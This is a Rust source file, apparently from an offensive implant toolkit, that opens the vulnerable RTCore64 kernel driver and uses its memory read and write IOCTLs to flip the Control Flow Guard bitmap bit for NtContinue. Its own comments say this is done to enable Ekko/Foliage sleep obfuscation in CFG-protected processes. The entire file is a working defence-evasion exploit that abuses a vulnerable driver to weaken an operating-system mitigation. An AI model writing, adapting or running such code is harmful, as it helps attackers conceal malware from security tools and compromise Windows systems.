//! cfg-write: minimal standalone CFG bitmap writer.
//! Opens RTCore64 directly (driver must already be running),
//! finds the CFG bitmap, and marks NtContinue as a valid indirect
//! call target — enabling Ekko/Foliage sleep obfuscation on
//! CFG-enabled processes.
#![cfg_attr(not(target_os = "windows"), allow(dead_code))]

use std::ffi::c_void;

#[cfg(target_os = "windows")]
fn main() {
    let device = to_wide("\\\\.\\RTCore64");
    let handle = unsafe {
        CreateFileW(device.as_ptr(), 0xC0000000, 0, std::ptr::null(),
            3, 0x80, std::ptr::null_mut())
    };
    if handle == INVALID_HANDLE_VALUE {
        eprintln!("[!] Cannot open \\\\.\\RTCore64");
        std::process::exit(1);
    }
    eprintln!("[+] \\\\.\\RTCore64 opened");

    let ntdll = unsafe { GetModuleHandleA(c"ntdll.dll".as_ptr().cast::<u8>()) };
    let nt_continue = unsafe { GetProcAddress(ntdll, c"NtContinue".as_ptr().cast::<u8>()) } as usize;
    eprintln!("[*] NtContinue = 0x{nt_continue:x}");

    let init = unsafe { GetProcAddress(ntdll, c"LdrSystemDllInitBlock".as_ptr().cast::<u8>()) } as usize;
    let sz = unsafe { *(init as *const u32) } as usize;
    eprintln!("[*] LdrSystemDllInitBlock size=0x{sz:x}");

    // kernel-tools-4: use the SHARED offset selection from operator-kernelsdk
    // (cfg::cfg_bitmap_offset) — this binary used to compute its own mapping
    // (0x40/0xC0/0xC8) that disagreed with nyx-kernel cfg-bypass (0x40/0x60/0x68)
    // for the same block sizes, so one of them always missed the bitmap.
    let off = nyx_operator_kernelsdk::cfg::cfg_bitmap_offset(sz);
    let bm = unsafe { *((init + off) as *const usize) };
    let bs = unsafe { *((init + off + 8) as *const usize) };
    eprintln!("[*] CFG bitmap=0x{bm:x} size=0x{bs:x}");
    if bm == 0 || bs == 0 { eprintln!("[!] no bitmap"); std::process::exit(1); }

    let bit = nt_continue >> 4;
    let bo = bit >> 3;
    let bp = (bit & 7) as u8;
    let va = bm + bo;
    eprintln!("[*] target VA=0x{va:x} byte_off={bo} bit={bp}");

    let mut op = [0u64; 6]; // MemoryOperation: code, addr, size, buf, pad, pad
    op[0] = 0x80002048; // READ
    op[1] = va as u64;
    op[2] = 1;
    let mut ret: u32 = 0;
    let ok = unsafe {
        DeviceIoControl(handle, 0x80002048,
            op.as_mut_ptr() as *mut c_void, 48,
            op.as_mut_ptr() as *mut c_void, 48,
            &mut ret, std::ptr::null_mut())
    };
    if ok == 0 { eprintln!("[!] read IOCTL fail"); unsafe { CloseHandle(handle); } std::process::exit(1); }

    let old = (op[3] & 0xFF) as u8;
    let was = (old >> bp) & 1;
    eprintln!("[*] old_byte=0x{old:02x} was_set={was}");

    let new = old | (1 << bp);
    if new == old { eprintln!("[+] already set"); unsafe { CloseHandle(handle); } return; }

    op[0] = 0x8000204C; // WRITE
    op[3] = new as u64;
    let ok = unsafe {
        DeviceIoControl(handle, 0x8000204C,
            op.as_mut_ptr() as *mut c_void, 48,
            std::ptr::null_mut(), 0,
            &mut ret, std::ptr::null_mut())
    };
    if ok == 0 { eprintln!("[!] write IOCTL fail"); unsafe { CloseHandle(handle); } std::process::exit(1); }

    eprintln!("[+] NtContinue CFG bit SET — Ekko/Foliage enabled!");
    unsafe { CloseHandle(handle); }
}

const INVALID_HANDLE_VALUE: *mut c_void = -1isize as *mut c_void;

extern "system" {
    fn CreateFileW(n: *const u16, d: u32, s: u32, sa: *const c_void, c: u32, f: u32, t: *mut c_void) -> *mut c_void;
    fn DeviceIoControl(h: *mut c_void, ctl: u32, ib: *mut c_void, isz: u32, ob: *mut c_void, osz: u32, br: *mut u32, ov: *mut c_void) -> i32;
    fn CloseHandle(h: *mut c_void) -> i32;
    fn GetModuleHandleA(n: *const u8) -> *mut c_void;
    fn GetProcAddress(h: *mut c_void, n: *const u8) -> *mut c_void;
}

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!("cfg-write: Windows-only diagnostic; nothing to do on this host");
}
